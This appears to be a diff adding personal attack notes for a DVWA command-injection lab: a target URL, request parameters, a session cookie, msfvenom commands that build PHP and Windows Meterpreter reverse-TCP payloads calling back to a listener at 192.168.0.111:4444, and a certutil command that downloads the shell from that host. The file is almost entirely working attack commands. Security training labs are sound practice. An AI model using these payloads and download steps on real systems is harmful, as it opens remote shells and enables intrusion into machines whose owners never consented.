@@ -1,0 +1,15 @@
+http://192.168.0.112/dvwa/vulnerabilities/exec/index.php
+
+{"ip":"192.168.0.111","Submit":"Submit"}
+
+{"PHPSESSID":"tjj0esrnt64heiqr50hbbpj8s4"}
+
+
+msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.0.111 LPORT=4444 -f raw > shell.php
+
+
+
+certutil.exe -urlcache -f http://192.168.0.111/shell.php shell.php
+
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.111 LPORT=4444 -f exe > shell.exe
